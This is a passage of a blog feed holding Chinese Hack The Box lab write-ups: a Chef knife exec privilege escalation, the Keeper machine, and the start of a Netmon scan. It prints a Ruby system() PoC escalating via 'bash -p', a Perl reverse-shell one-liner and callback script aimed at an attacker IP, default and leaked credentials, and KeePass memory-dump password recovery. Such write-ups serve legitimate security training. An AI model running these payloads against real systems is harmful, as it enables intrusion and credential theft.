class="token string-literal"><span class="token string">"= 0.3.10"</span></span>  gem <span class="token string-literal"><span class="token string">"toml-rb"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"tomlrb"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"train"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.4.9"</span></span>  gem <span class="token string-literal"><span class="token string">"train-aws"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.35"</span></span>  gem <span class="token string-literal"><span class="token string">"train-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.4.9"</span></span>  gem <span class="token string-literal"><span class="token string">"train-habitat"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.22"</span></span>  gem <span class="token string-literal"><span class="token string">"train-winrm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.12"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-box"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-color"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.6.0"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-cursor"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.7.1"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-prompt"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.23.0"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-reader"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.9.0"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-screen"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.8.1"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-spinner"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.9.3"</span></span>  gem <span class="token string-literal"><span class="token string">"tty-table"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.12.0"</span></span>  gem <span class="token string-literal"><span class="token string">"tzinfo"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.9"</span></span>  gem <span class="token string-literal"><span class="token string">"uber"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"unf"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.4"</span></span>  gem <span class="token string-literal"><span class="token string">"unf_ext"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.7.7"</span></span>  gem <span class="token string-literal"><span class="token string">"unf_ext"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.7.7"</span></span>  gem <span class="token string-literal"><span class="token string">"unf_ext"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.7.7"</span></span>  gem <span class="token string-literal"><span class="token string">"unicode-display_width"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"unicode_utils"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.4.0"</span></span>  gem <span class="token string-literal"><span class="token string">"uuidtools"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"virtus"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.5"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-appliance"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-cis"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-content"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-runtime"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-sdk"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-vapi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"vsphere-automation-vcenter"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"webrick"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"winrm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.6"</span></span>  gem <span class="token string-literal"><span class="token string">"winrm-elevated"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.3"</span></span>  gem <span class="token string-literal"><span class="token string">"winrm-fs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.5"</span></span>  gem <span class="token string-literal"><span class="token string">"wisper"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"wmi-lite"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.5"</span></span>  gem <span class="token string-literal"><span class="token string">"yard"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.9.26"</span></span>  gem <span class="token string-literal"><span class="token string">"chef"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"bundler"</span></span> <span class="token comment"># force activation of bundler to avoid unresolved specs if there are multiple bundler versions</span>  spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Specification<span class="token punctuation">.</span>find_by_name<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"chef"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span><span class="token punctuation">)</span><span class="token keyword">else</span>  spec <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Specification<span class="token punctuation">.</span>find_by_name<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"chef"</span></span><span class="token punctuation">)</span><span class="token keyword">end</span><span class="token keyword">unless</span> Gem<span class="token double-colon punctuation">::</span>Specification<span class="token punctuation">.</span>unresolved_deps<span class="token punctuation">.</span>empty<span class="token operator">?</span>  <span class="token variable">$stderr</span><span class="token punctuation">.</span>puts <span class="token string-literal"><span class="token string">"APPBUNDLER WARNING: unresolved deps are CRITICAL performance bug, this MUST be fixed"</span></span>  Gem<span class="token double-colon punctuation">::</span>Specification<span class="token punctuation">.</span>reset<span class="token keyword">end</span>bin_file <span class="token operator">=</span> spec<span class="token punctuation">.</span>bin_file<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"knife"</span></span><span class="token punctuation">)</span>Kernel<span class="token punctuation">.</span>load<span class="token punctuation">(</span>bin_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="chef-knife"><a href="#chef-knife" class="headerlink" title="chef-knife"></a>chef-knife</h2><blockquote><p>Knife 是 Chef 的命令行工具，用于与 Chef 服务器进行交互。一个人用它来上传Cookbook和管理 Chef 的其他方面。它提供了本地机器上的 ChefDK（Repo）和 Chef 服务器之间的接口。它有助于管理</p></blockquote><p>试运行一下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo /usr/bin/knifeERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)Usage: knife sub-command (options)                                 -s, --server-url URL             Chef Infra Server URL.                      --chef-zero-host HOST        Host to start Chef Infra Zero on.        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.    -k, --key KEY                    Chef Infra Server API client key.        --[no-]color                 Use colored output, defaults to enabled.    -c, --config CONFIG              The configuration file to use.        --config-option OPTION=VALUE Override a single configuration option.        --defaults                   Accept default values for all questions.    -d, --disable-editing            Do not open EDITOR, just accept the data as is.    -e, --editor EDITOR              Set the editor to use for interactive commands.    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).        --[no-]fips                  Enable FIPS mode.                                   -F, --format FORMAT              Which format to use for output. (valid options: 'summary', 'text', 'json', 'yaml', or 'pp')                                                 --[no-]listen                Whether a local mode (-z) server binds to a port.         -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.    -u, --user USER                  Chef Infra Server API client username.        --print-after                Show the data after a destructive operation.        --profile PROFILE            The credentials profile to select.    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.    -v, --version                    Show Chef Infra Client version.    -y, --yes                        Say yes to all prompts for confirmation.    -h, --help                       Show this help message.   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><h4 id="什么是Chef"><a href="#什么是Chef" class="headerlink" title="什么是Chef"></a>什么是Chef</h4><p><img src="/Rxi134_FILE/8e777117a4d072137709b54b6f80013e_MD5.jpeg"><br>Chef有三个重要的概念：（如上图所示）<br>它们的合作关系大致是这样的， Workstation把资源或者说是一些要被运行的命令上传到Chef-Server上， Nodes自动通过Chef-Server拿到属于自己的执行任务到本地执行，这样可达到一个将军指挥千军万马的效果:smirk:。</p><ol><li>Chef Server<br> 存放所有通过Workstation上传的资源，和用户等公共数据（用PostgreSQL）。 可以干脆叫它为资源服务器，大家都可以与它通讯（用RabbitMQ ）， 本身提供一个在线管理工具叫<code>chef-server-webui</code>（用Nginx，包括它的rest-api）。<br> Chef Server只能安装在linux系统上。</li><li>Workstation<br> 简单理解为管理员操作机，通过安装的工具knife远程操作Chef-Server上的资源，或者注册Nodes等<br> 这个可以安装在任意系统上，包括windows</li><li>Nodes<br> 一些客户端的机子，它们是内部装有一个工具叫做Chef-Client，这东西会自动到Chef-Server上获取自己的要执行命令清单<br> 可以安装在任意系统上，包括windows</li></ol><h4 id="什么是Knife"><a href="#什么是Knife" class="headerlink" title="什么是Knife"></a>什么是Knife</h4><p>Knife 是 Chef 的命令行工具，用于与 Chef 服务器交互。人们使用它来上传Cookbook（食谱）和管理 Chef 的其他方面。</p><h2 id="发现攻击点：Knife-exec"><a href="#发现攻击点：Knife-exec" class="headerlink" title="发现攻击点：Knife exec"></a>发现攻击点：Knife exec</h2><p>knife需要子命令才能运行 <a href="https://www.w3ccoo.com/chef/chef_knife_setup.html">Chef - Knife 设置 | Chef 教程</a></p><p>我从中发现了一个有意思的子命令 <code>knife exec</code><br><img src="/Rxi134_FILE/1284890b061ddd8963b0d9311f41f7c3_MD5.jpeg"></p><p>问问GPT：</p><blockquote><p><code>knife exec</code> 是 Chef 的 <code>knife</code> 工具中的一个子命令，允许你通过执行 Ruby 代码来与 Chef Infra Server 进行交互。这个命令可以用于执行任意的 Ruby 脚本，操作 Chef 资源，或者自动化某些任务。</p></blockquote><p><img src="/Rxi134_FILE/c45d25015edd9619103f62d2cc1abae2_MD5.jpeg"></p><p>🤔那我创建一个恶意.rb文件的话…poc如下：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/env ruby</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'chef/api_client'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'chef/node'</span></span>bash_command <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'whaomi'</span></span>puts <span class="token string-literal"><span class="token string">"Executing bash command: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">bash_command</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>system<span class="token punctuation">(</span>bash_command<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/bbdbf1fa73f4bac5d41765d98a601381_MD5.jpeg"></p><p>把命令改为<code>bash -p</code>即可实现提权<br><img src="/Rxi134_FILE/2a55cae74f457f64ed93f8158b796da7_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个机器还是很简单的，粗浅了解了一下 chef 以及 ruby 语言</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy L-Keeper</title>
      <link href="/2025/01/04/Easy%20L-Keeper/"/>
      <url>/2025/01/04/Easy%20L-Keeper/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>访问ip<br><img src="/Rxi134_FILE/0edca269088ac282555c43cb3f4d9fc8_MD5.jpeg"></p><p>在hosts添加两行</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">10.10.11.227 tickets.keeper.htb10.10.11.227 keeper.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 tickets.keeper.htb&#x2F;<br><img src="/Rxi134_FILE/399868b5209eb9a8fafaed5f93184751_MD5.jpeg"></p><p>访问一下 keeper.htb&#x2F;， 就是之前跳转的界面</p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><p>先简单扫下端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE    SERVICE22/tcp    open     ssh| ssh-hostkey:|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)25/tcp    open     smtp|_smtp-commands: Couldn't establish connection on port 2537/tcp    filtered time80/tcp    open     http| http-methods:|_  Supported Methods: GET HEAD|_http-title: Site doesn't have a title (text/html).110/tcp   open     pop3125/tcp   filtered locus-map444/tcp   filtered snpp514/tcp   filtered shell1105/tcp  filtered ftranhc1233/tcp  filtered univ-appserver1840/tcp  filtered netopia-vo22107/tcp  filtered msmq-mgmt2251/tcp  filtered dif-port2399/tcp  filtered fmpro-fdal3827/tcp  filtered netmpi3871/tcp  filtered avocent-adsap5033/tcp  filtered jtnetd-server5357/tcp  filtered wsdapi5560/tcp  filtered isqlplus5877/tcp  filtered unknown5961/tcp  filtered unknown6502/tcp  filtered netop-rc7070/tcp  filtered realserver8254/tcp  filtered unknown9000/tcp  filtered cslistener9002/tcp  filtered dynamid9900/tcp  filtered iua16113/tcp filtered unknown22939/tcp filtered unknown49999/tcp filtered unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>确定cms是 Best Practical Request Tracker (RT) ，版本 4.4.4+dfsg-2ubuntu1</p><h2 id="搜索默认密码"><a href="#搜索默认密码" class="headerlink" title="搜索默认密码"></a>搜索默认密码</h2><p>先网上搜索一下有没有默认密码<code>root:password</code><br><img src="/Rxi134_FILE/b6e3f5982dfbb4c5d0a77fbdf6613622_MD5.jpeg"></p><p>直接进来了<br><img src="/Rxi134_FILE/f9509d1c38b16a06a282a857c4933557_MD5.jpeg"></p><h2 id="绕过csrf检测"><a href="#绕过csrf检测" class="headerlink" title="绕过csrf检测"></a>绕过csrf检测</h2><p>网上没直接找到什么nday梭哈，先手测下，但是<br><img src="/Rxi134_FILE/6ce18498576394e69cd9e5cf826ce314_MD5.jpeg"></p><p>我的任何修改操作都会报这个错误，bp抓包看看<br><img src="/Rxi134_FILE/4db51177223fdd9aa4ae0dfa85313f35_MD5.jpeg"></p><p>有可能是只信任来自 keeper.htb 的请求，把referer改为 <code>http://keeper.htb/rt/Admin/Scrips/Create.html</code><br><img src="/Rxi134_FILE/a92106c2f60e1b613b8a52954d2554bb_MD5.jpeg"><br>这下好了</p><h2 id="创建并触发perl脚本反弹shell（失败）"><a href="#创建并触发perl脚本反弹shell（失败）" class="headerlink" title="创建并触发perl脚本反弹shell（失败）"></a>创建并触发perl脚本反弹shell（失败）</h2><p>在翻找后台的时候发现一个脚本管理器</p><p>我们在本地监听 1134端口，然后写入poc：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">use</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token punctuation">;</span><span class="token keyword">use</span> HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Request<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$ua</span> <span class="token operator">=</span> LWP<span class="token punctuation">:</span><span class="token punctuation">:</span>UserAgent<span class="token operator">-></span>new<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string">'http://10.10.14.2:1234'</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$request</span> <span class="token operator">=</span> HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Request<span class="token operator">-></span>new<span class="token punctuation">(</span>GET <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token variable">$ua</span><span class="token operator">-></span>request<span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>讲解下面这几项参数：</p><ul><li><p>Condition（触发条件）：我设置为 On Create，也就是创建 ticket 时就会执行我们的poc</p></li><li><p>Action（要执行的脚本）：设为 User Defined 即可<br><img src="/Rxi134_FILE/ea2f8614e8718301c30a3bc810b9d6a0_MD5.jpeg"></p></li><li><p>Custom condition（自定义条件）：不填</p></li><li><p>Custom action preparation code</p></li><li><p>Custom action commit code<br><img src="/Rxi134_FILE/8e54038e03920fd76d07d688ac407b58_MD5.jpeg"></p></li></ul><p>然后创建ticket触发脚本<br><img src="/Rxi134_FILE/1fafc44b1cf26658a272a8d8921724c3_MD5.jpeg"></p><p>成功收到响应<br><img src="/Rxi134_FILE/394c80fe332f63edea170ab6014411ad_MD5.jpeg"></p><p>反弹 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">perl <span class="token parameter variable">-e</span> <span class="token string">'use Socket;$i="10.10.14.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");&#125;;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是jb怎么都返回不回来shell…，难道是exec被禁了？</p><h2 id="备注ssh密码"><a href="#备注ssh密码" class="headerlink" title="*备注ssh密码"></a>*备注ssh密码</h2><blockquote><p>哎我真是服了</p></blockquote><p><img src="/Rxi134_FILE/775b52740b5730d11324fca0c41f5979_MD5.jpeg"></p><p>点进详细信息<br><img src="/Rxi134_FILE/d1118883a520707ef17c83a4abf76f45_MD5.jpeg"></p><p>这可能就是一组密码凭据：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">lnorgaard:Welcome2023!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ssh 连接<br><img src="/Rxi134_FILE/201ae9bf26d8856d553c56d97df691c4_MD5.jpeg"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>Linux keeper 5.15.0-78-generic</p><p>机器上就只有用户 lnorgaard 和 root</p><h2 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h2><p>没有找到什么有用的</p><h2 id="RT30000-zip"><a href="#RT30000-zip" class="headerlink" title="RT30000.zip"></a>RT30000.zip</h2><p>目录下有个压缩包挺突兀<br><img src="/Rxi134_FILE/bb27bd0701f988671f0bb1228ece6cf4_MD5.jpeg"><br><img src="/Rxi134_FILE/a30dc6faaff0a79c30f620eb346fb19f_MD5.jpeg"></p><h2 id="KeePass-CVE-2023-3278"><a href="#KeePass-CVE-2023-3278" class="headerlink" title="KeePass CVE-2023-3278"></a>KeePass CVE-2023-3278</h2><blockquote><p>keepass是一个密码管理器</p></blockquote><p>.kbdx 是 KeePass 的数据库文件</p><blockquote><p>当输入主密钥以解锁 KeePass 数据库时，输入框的值会存储在内存中。虽然使用 ‘●’ 字符将其视觉上隐藏，但最后一个字符在内存中短暂可见，并持续存储在那里（<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32784">CVE-2023-3278</a>，于 2023 年 6 月 3 日发布的 KeePass 2.54 中修复）</p></blockquote><p>工具地址：<a href="https://github.com/JorianWoltjer/keepass-dump-extractor/releases">Releases · JorianWoltjer&#x2F;keepass-dump-extractor</a></p><p><img src="/Rxi134_FILE/dc221b56b543932f4f3cfb13d7e29a00_MD5.jpeg"></p><p>把它复制下来</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">dgrødmedflødedgrdmedfldedgrodmedflode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是都不对</p><h3 id="密码推测"><a href="#密码推测" class="headerlink" title="密码推测"></a>密码推测</h3><p>看着感觉像个单词，网上搜索下<br><img src="/Rxi134_FILE/80942ebd2ed2b69db6662ab94064822a_MD5.jpeg"></p><p>有没有可能是</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">rødgrød med fløde<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>🐂，成功了！<br><img src="/Rxi134_FILE/6ff2c9276812481fb0ad8a1a203b46ed_MD5.jpeg"></p><p>这里面存储着root用户的密码<br><img src="/Rxi134_FILE/90c186d735963765e6b4868677a06a07_MD5.jpeg"></p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><h3 id="密码连接（失败）"><a href="#密码连接（失败）" class="headerlink" title="密码连接（失败）"></a>密码连接（失败）</h3><p>查看sshd_config，允许root远程登录，但是禁用了密码认证<br><img src="/Rxi134_FILE/9a1e2c49b71b8722645f713a0a0f271e_MD5.jpeg"></p><h3 id="putty-转-openssh"><a href="#putty-转-openssh" class="headerlink" title="putty 转 openssh"></a>putty 转 openssh</h3><p>不过notes里还有存有putty的私钥，把其内容保存为 key.pkk<br><img src="/Rxi134_FILE/8abf5aa20115be76b8f576f4de9b4fc6_MD5.jpeg"></p><p>把 putty 转为 openssh 格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ puttygen <span class="token string">'/mnt/c/Users/Anonymous/Desktop/key.ppk'</span> <span class="token parameter variable">-O</span> private-openssh <span class="token parameter variable">-o</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接即可<br><img src="/Rxi134_FILE/48a3ad1cf809efaf68bf23c537f31339_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>没看wp就做出来了，不错</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy W-Netmon</title>
      <link href="/2025/01/01/Easy%20W-Netmon/"/>
      <url>/2025/01/01/Easy%20W-Netmon/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>80是个登录界面，PRTG？<br><img src="/Rxi134_FILE/a1496244f6df21b46da829111cb976f3_MD5.jpeg"></p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">ORT      STATE    SERVICE        VERSION21/tcp    open     ftp            Microsoft ftpd| ftp-syst: |_  SYST: Windows_NT| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-02-19  11:18PM                 1024 .rnd| 02-25-19  09:15PM       &lt;DIR>          inetpub| 07-16-16  08:18AM       &lt;DIR>          PerfLogs| 02-25-19  09:56PM       &lt;DIR>          Program Files| 02-02-19  11:28PM       &lt;DIR>          Program Files (x86)| 02-03-19  07:08AM       &lt;DIR>          Users|_11-10-23  09:20AM       &lt;DIR>          Windows80/tcp    open     http           PRTG/18.1.37.13946|_http-trane-info: Problem with XML parsing of /evox/about|_http-server-header: PRTG/18.1.37.13946| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm135/tcp   open     msrpc?139/tcp   open     netbios-ssn?445/tcp   open     microsoft-ds?668/tcp   filtered mecomm1051/tcp  filtered optima-vnet1071/tcp  filtered bsquare-voip3527/tcp  filtered beserver-msg-q3809/tcp  filtered apocd7019/tcp  filtered doceri-ctl48080/tcp filtered unknown49400/tcp filtered compaqdiagHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required| smb2-time: |   date: 2024-12-28T14:09:28|_  start_date: 2024-12-28T14:05:11| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一看ftp可以匿名登录</p><h1 id="入侵"><a href="#入侵" class="headerlink" 